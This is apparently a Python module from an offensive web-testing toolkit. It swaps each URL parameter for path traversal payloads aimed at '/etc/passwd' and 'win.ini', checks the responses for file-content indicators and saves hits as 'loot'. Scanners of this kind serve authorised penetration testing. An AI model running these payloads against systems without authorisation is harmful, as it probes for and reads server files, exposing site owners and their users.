from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import TYPE_CHECKING
from rich.panel import Panel
from core.ui import console, log_info, log_error, log_warning, log_success
from core.logger import save_loot
from core.utils import load_payloads

if TYPE_CHECKING:
    from core.context import TsurugiContext

# LFI Payloads (Linux & Windows)
LFI_PAYLOADS = load_payloads("lfi.txt", fallback=[
    "../../../../etc/passwd",
    "C:/Windows/win.ini"
])

LFI_INDICATORS = [
    "root:x:0:0",
    "[extensions]",
    "for 16-bit app support"
]

def run_lfi_scan(ctx: 'TsurugiContext', url: str) -> bool:
    """Scans URL parameters for Local File Inclusion vulnerabilities."""
    console.print(f"\n[bold red][*] TSURUGI LFI MODULE[/bold red] -> [yellow]{url}[/yellow]")

    requester = ctx.get_requester()

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        log_error("No parameters found to inject.")
        return False

    detected = False

    for param in params.keys():
        console.print(f"Testing parameter: [bold cyan]{param}[/bold cyan]")

        for payload in LFI_PAYLOADS:
            # Construct Fuzzed URL
            fuzzed_params = params.copy()
            fuzzed_params[param] = [payload] 
            query_string = urlencode(fuzzed_params, doseq=True)
            fuzzed_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

            try:
                resp = requester.get(fuzzed_url, timeout=5)
                if not resp: continue
                
                # Check for indicators
                for indicator in LFI_INDICATORS:
                    if indicator in resp.text:
                        console.print(Panel(
                            f"Payload: {payload}\nIndicator Found: {indicator}\nURL: {fuzzed_url}",
                            title=f"[!] LFI DETECTED ({param})",
                            border_style="red"
                        ))
                        detected = True
                        save_loot("lfi", fuzzed_url, {
                            "payload": payload,
                            "indicator": indicator
                        })
                        break
            except Exception as e:
                log_warning(f"Request error: {e}")
            
            if detected: break
        if detected: break

    if not detected:
        console.print("\n[dim]No obvious LFI vulnerabilities found.[/dim]")
    
    return detected